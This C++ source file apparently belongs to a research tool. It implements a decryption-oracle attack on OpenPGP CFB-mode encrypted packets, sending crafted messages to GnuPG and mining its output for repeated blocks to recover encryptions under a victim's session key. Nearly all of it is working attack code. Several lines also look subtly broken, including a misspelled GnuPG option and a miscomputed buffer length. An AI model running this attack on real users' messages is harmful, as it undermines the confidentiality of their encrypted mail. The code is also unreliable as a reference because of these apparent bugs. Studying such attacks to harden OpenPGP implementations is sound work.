

#include "sed-oracle.h"
#include "sedp.h"
#include "except.h"
#include "file_util.h"
#include "subprocess.hpp"
#include <memory>
#include <botan/auto_rng.h>
#include <iostream>
#include "util.h"
#include "opgp_cfb_decr_fun_simulation.h"
#include "detect_pattern.h"


// Note: boost.process seems badly maintained: https://github.com/bitcoin/bitcoin/issues/24907
//
namespace sp = subprocess;

namespace
{

/**
 * @brief Computes the ECB decryption result for a certain guess for the offset of the CFB decryption result returned by
 * the oracle into the CFB ciphertext.
 *
 * @param cfb_decryption_result The CFB decrypted ciphertext returned by the oracle.
 * @param second_step_ct The second-stop CFB ciphertext that was input into the decryption oracle.
 * @param offset_in_ct The guess for the offset that the start of the CFB decryption result has into the second-step CFB
 * ciphertext.
 *
 * @return The ECB encryption of the blocks that were CFB-decrypted
 */
std::vector<uint8_t> recover_ecb_encrypted_blocks_from_cfb_decryption_for_offset(
    std::span<uint8_t> cfb_decryption_result, std::span<uint8_t> second_step_ct, uint32_t offset_in_ct)
{
    const unsigned block_size = 16;
    std::vector<uint8_t> ecb_encrypted_blocks;
    uint32_t offset_in_block  = offset_in_ct % block_size;
    uint32_t next_block_index = ((offset_in_ct + block_size) / block_size) - 1;
    uint32_t next_block_begin = offset_in_ct + (block_size - offset_in_block);
    // XOR the whole available decryption result starting from the start of the next block with ciphertext to recover
    // the ECB encrypted blocks.
    for (uint32_t i = next_block_begin; i < cfb_decryption_result.size(); i++)
    {
        // i runs through all the positions in the decryption result
        uint32_t this_ct_offset = offset_in_ct + i;
        if (this_ct_offset > second_step_ct.size())
        {
            std::cerr
                << "breaking because XOR of plaintext and ciphertext because ciphertext length is exhausted already"
                << std::endl;
            break;
        }
        ecb_encrypted_blocks.push_back(second_step_ct[this_ct_offset] ^ cfb_decryption_result[i]);
    }
    return ecb_encrypted_blocks;
}

/**
 * @brief process a candidate for the ECB decryption result starting at a block boundary. Try to find a repeated pattern
 * of blocks of the specified length.
 *
 * @param ecb_blocks the candidate sequence starting at a block boundary.
 * @param pattern_length_in_blocks the number of blocks the sought repeated pattern is comprised of.
 *
 * @return the the found pattern that was repeated. returns an empty vector if no repetition. In case of a detected
 * repetition, the result may be shorter than the specified pattern length if there was insufficient remaining data, but
 * then has at least lenght of one block.
 */
std::vector<uint8_t> determine_repeated_pattern_of_blocks(std::span<const uint8_t> ecb_blocks,
                                                          uint32_t pattern_length_in_blocks)
{
    const unsigned block_size        = 16;
    uint32_t pattern_length_in_bytes = pattern_length_in_blocks * block_size;
    bool found_pattern_repetition    = false;
    for (uint32_t i = 0; i < ecb_blocks.size(); i += block_size)
    {
        if (ecb_blocks.size() - i < (block_size + 1) * pattern_length_in_blocks)
        {
            // don't process if there can't be at least a single complete pattern and at least the first block of the
            // first repetition
            break;
        }
        // presume the start of the pattern is at this block
        std::span<const uint8_t> candidate(ecb_blocks.begin() + i, ecb_blocks.begin() + i + pattern_length_in_bytes);
        uint32_t rem_len_in_ecb_blocks = ecb_blocks.size() - i;
        uint32_t compare_len           = std::min(pattern_length_in_bytes, rem_len_in_ecb_blocks);
        auto end_of_first_pattern      = ecb_blocks.begin() + i + compare_len;
        auto start_of_compare_region   = ecb_blocks.begin() + i + pattern_length_in_bytes;
        if (std::equal(ecb_blocks.begin() + i, end_of_first_pattern, start_of_compare_region))
        {
            return std::vector<uint8_t>(start_of_compare_region, start_of_compare_region + compare_len);
        }
    }
    return std::vector<uint8_t>();
}
} // namespace

std::vector<uint8_t> invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params)
{
    using enum openpgp_app_e;
    if (decr_params.app_type != gnupg)
    {
        throw cli_exception_t("cfb_opgp_decr_oracle(): only GnuPG is currently supported as an oracle");
    }
    std::unique_ptr<sp::Popen> p;
    std::vector<char> to_stdin;

    if (std::holds_alternative<std::string>(decr_params.ct_filename_or_data))
    {
        // std::cout << "creating process with file-based decryption..." << std::endl;
        p = std::unique_ptr<sp::Popen>(new sp::Popen({decr_params.application_path,
                                                      "--batch",
                                                      "--decrypt",
                                                      std::get<std::string>(decr_params.ct_filename_or_data)},
                                                     sp::output {sp::PIPE},
                                                     sp::error {sp::PIPE},
                                                     sp::defer_spawn {true}));
    }
    else if (std::holds_alternative<std::vector<uint8_t>>(decr_params.ct_filename_or_data))
    {
        //        throw Exception("stdin input to appication not available");
        p            = std::unique_ptr<sp::Popen>(new sp::Popen(
            {decr_params.application_path, "--batch", "--decrypt"}, sp::output {sp::PIPE}, sp::error {sp::PIPE}, sp::defer_spawn {true}));
        auto ct_data = std::get<std::vector<uint8_t>>(decr_params.ct_filename_or_data);
        for (size_t i = 0; i < ct_data.size(); i++)
        {
            to_stdin.push_back(ct_data[i]);
        }
    }
    else
    {
        throw Exception("internal error: neither file nor data supplied for ciphertext");
    }


    // auto stdout_stderr = p->communicate(to_stdin);
    p->start_process();
    p->send(to_stdin);
    int poll       = p->poll();
    uint32_t count = 0;
    while (poll == -1)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
        poll = p->poll();
        if (count++ > 1000)
        {
            break;
        }
    }
    std::cout << std::format("poll = {}\n", poll);
    if (poll == -1)
    {
        std::cout << "killing process ...\n";
        p->kill();
        return std::vector<uint8_t>();
    }
    std::cout << "calling communicate ... ";
    auto stdout_stderr = p->communicate();
    std::cout << "... finished\n";
    auto obuf   = stdout_stderr.first;
    auto errbuf = stdout_stderr.second;

    if (obuf.length)
    {

        p = std::unique_ptr<sp::Popen>(new sp::Popen(
            {decr_params.application_path, "--list--packets", std::get<std::string>(decr_params.ct_filename_or_data)},
            sp::output {sp::PIPE},
            sp::error {sp::PIPE}));
        std::cout << "stdout: " << obuf.buf.data() << std::endl;
        std::cerr << "stderr: " << errbuf.buf.data() << std::endl;
    }
    /*std::cout << "stdout: " << obuf.buf.data() << std::endl;
    std::cout << "stdout len: " << obuf.length << std::endl;
    std::cerr << "stderr: " << errbuf.buf.data() << std::endl;
    std::cerr << "stderr len: " << errbuf.length << std::endl;*/
    std::vector<uint8_t> result;
    result.insert(result.begin(), obuf.buf.data(), obuf.buf.data() + obuf.length);
    return result;
}

cfb_decr_oracle_result_t cfb_opgp_decr_oracle(run_time_ctrl_t rtc,
                                              uint32_t iter,
                                              openpgp_app_decr_params_t const& decr_params,
                                              size_t nb_leading_random_bytes,
                                              std::span<const uint8_t> pkesk,
                                              std::span<const uint8_t> oracle_blocks,
                                              uint32_t oracle_pattern_len_in_blocks,
                                              std::filesystem::path const& msg_file_path,
                                              std::span<const uint8_t> session_key)
{
    const unsigned block_size = 16;
    if (!std::holds_alternative<std::monostate>(decr_params.ct_filename_or_data))
    {
        throw Exception("ciphertext or filename specified in decryption parameters, this may not be done here");
    }
    lenght_is_multiple_of_aes_block_size_or_throw(oracle_blocks);
    uint32_t nb_oracle_blocks                 = oracle_blocks.size() / block_size;
    size_t nb_leading_random_blocks           = (nb_leading_random_bytes + block_size - 1) / block_size;
    size_t nb_leading_random_bytes_rounded_up = nb_leading_random_bytes * block_size;
    std::vector<uint8_t> first_step_ct(block_size + 2); // the 18 first zero bytes form the 1st-step ciphertext
    std::vector<uint8_t> second_step_ct(nb_leading_random_bytes_rounded_up);
    Botan::AutoSeeded_RNG rng;
    rng.randomize(std::span(second_step_ct.begin(), second_step_ct.end()));
    second_step_ct.insert(second_step_ct.end(), oracle_blocks.begin(), oracle_blocks.end());
    auto ciphertext = first_step_ct;
    std::copy(second_step_ct.begin(), second_step_ct.end(), std::back_inserter(ciphertext));
    symm_encr_data_packet_t sed = symm_encr_data_packet_t::create_sedp_from_ciphertext(ciphertext);
    auto encoded_sed            = sed.get_encoded();
    std::vector<uint8_t> pgp_msg;
    pgp_msg.assign(pkesk.begin(), pkesk.end());
    pgp_msg.insert(pgp_msg.end(), encoded_sed.begin(), encoded_sed.end());
    write_binary_file(std::span(pgp_msg), msg_file_path);
    auto decr_params_copy(decr_params);
    decr_params_copy.ct_filename_or_data = msg_file_path;
    auto decryption_result               = invoke_cfb_opgp_decr(decr_params_copy);

    std::vector<uint8_t> recovered_blocks;
    if (decryption_result.size() > 0)
    {
        // check for block repetition pattern in CFB plaintext
        if (detect_pattern::has_byte_string_repeated_block_at_any_offset(decryption_result,
                                                                         oracle_pattern_len_in_blocks))
        {
            rtc.potentially_write_run_time_file(pgp_msg, std::format("random_decryption_input-{}", iter));
            // std::cout << "size of session key = " << session_key.size() << std::endl;
            if (session_key.size() > 0)
            {
                auto plaintext = openpgp_cfb_decryption_sim(ciphertext, std::make_optional(std::span(session_key)));
                rtc.potentially_write_run_time_file(std::span(plaintext),
                                                    std::format("random_decryption_plaintext-{}", iter));
            }
            rtc.potentially_write_run_time_file(decryption_result, std::format("random_decryption_result-{}", iter));
            recovered_blocks = oracle_blocks_recovery_from_cfb_decryption_result(
                decryption_result, oracle_pattern_len_in_blocks, nb_leading_random_bytes, second_step_ct);
            std::cout << "recovered blocks size = " << recovered_blocks.size() << std::endl;
            if (recovered_blocks.size())
            {
                rtc.potentially_write_run_time_file(recovered_blocks, std::format("recovered_blocks-{}", iter));
            }
        }
    }
    return cfb_decr_oracle_result_t(
        {.decryption_result = decryption_result, .recovered_encrypted_blocks = recovered_blocks});
}


std::vector<uint8_t> oracle_blocks_recovery_from_cfb_decryption_result(std::span<uint8_t> cfb_decryption_result,
                                                                       uint32_t pattern_length_in_blocks,
                                                                       uint32_t nb_leading_random_bytes_len,
                                                                       std::span<uint8_t> second_step_ct)
{
    /**
     * nb_query_blocks_repetitions is the maximal number of equal blocks that we can expect to find. Due to arbitrary
     * offsets into the ciphertext and cutoffs at the end, the actual must be expected to be less.
     */
    uint32_t second_step_ciphertext_len      = second_step_ct.size();
    uint32_t max_pattern_area_length_from_ct = second_step_ciphertext_len - nb_leading_random_bytes_len;
    uint32_t max_pattern_area_length         = std::min(max_pattern_area_length_from_ct, second_step_ciphertext_len);
    unsigned block_size                      = 16;
    // we iterate through the possible offsets that the decryption result has in the ciphertext.
    // for each of these offsets, we compute the presumed query results (i.e. reconstruct the block decryptions
    // from the CFB-decrypted result).
    uint32_t max_offset = second_step_ciphertext_len - cfb_decryption_result.size();
    for (uint32_t offset_in_ct = 0; offset_in_ct <= max_offset; offset_in_ct++)
    {
        auto candidate_ecb_blocks = recover_ecb_encrypted_blocks_from_cfb_decryption_for_offset(
            cfb_decryption_result, second_step_ct, offset_in_ct);
        // now we have a candidate result for the block decryption. We verify now whether it contains at least one
        // repetion of the length of the query pattern.
        auto repeatet_pattern = determine_repeated_pattern_of_blocks(candidate_ecb_blocks, pattern_length_in_blocks);
        if (repeatet_pattern.size() > 0)
        {
            return repeatet_pattern;
        }
    }
    return std::vector<uint8_t>();
}
